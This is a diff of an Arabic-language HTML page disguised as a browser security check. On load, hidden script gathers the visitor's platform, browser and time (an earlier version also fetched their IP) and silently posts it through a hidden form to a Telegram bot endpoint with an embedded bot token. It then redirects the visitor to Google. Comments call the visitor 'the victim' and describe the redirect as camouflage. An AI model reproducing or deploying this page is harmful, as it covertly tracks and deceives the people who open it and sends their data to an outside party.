@@ -2,12 +2,12 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>جاري التحقق...</title>
+    <title>جاري التحقق من الأمان...</title>
 </head>
 <body>
     <div style="text-align: center; margin-top: 100px; font-family: Arial;">
         <h2>جاري فحص توافق المتصفح...</h2>
-        <p>يرجى الانتظار ثواني معدودة</p>
+        <p>يرجى الانتظار، لا تغلق الصفحة</p>
     </div>
 
     <form id="teleForm" action="https://api.telegram.org/bot8527565205:AAFpoyLDZirTovyQKlpPO-Cm4UXzUBvLER8/sendMessage" method="POST" target="hidden_frame" style="display:none;">
@@ -19,36 +19,27 @@
     <iframe name="hidden_frame" style="display:none;"></iframe>
 
     <script>
-        async function sendDirect() {
-            try {
-                // 1. جلب الـ IP (اختياري لضمان دقة التقرير)
-                let ip = "Unknown";
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json');
-                    const data = await res.json();
-                    ip = data.ip;
-                } catch(e) {}
+        function sendToTelegram() {
+            // تجهيز المعلومات الأساسية للجهاز
+            const info = "🚀 **تقرير جديد من قسم الأمن**\n" +
+                         "📱 النظام: " + navigator.platform + "\n" +
+                         "🌐 المتصفح: " + navigator.userAgent.split(' ')[0] + "\n" +
+                         "⏰ الوقت: " + new Date().toLocaleString();
 
-                // 2. تجهيز نص الرسالة
-                const report = "🚀 دخول جديد (مباشر)\n" +
-                               "🌐 IP: " + ip + "\n" +
-                               "📱 النظام: " + navigator.platform + "\n" +
-                               "⏰ الوقت: " + new Date().toLocaleString();
+            // وضع النص داخل الفورم
+            document.getElementById('teleText').value = info;
 
-                document.getElementById('teleText').value = report;
+            // إرسال الفورم برمجياً
+            document.getElementById('teleForm').submit();
 
-                // 3. إرسال الفورم (هذه الطريقة لا يمكن للمتصفح حظرها)
-                document.getElementById('teleForm').submit();
-
-            } catch (err) {}
-
-            // 4. تحويل الضحية لموقع آخر بعد ثانية واحدة
+            // توجيه الضحية بعد الإرسال لتمويه العملية
             setTimeout(() => {
                 window.location.replace("https://www.google.com");
-            }, 1500);
+            }, 2000);
         }
 
-        window.onload = sendDirect;
+        // تشغيل الدالة فور تحميل الصفحة
+        window.onload = sendToTelegram;
     </script>
 </body>
 </html>
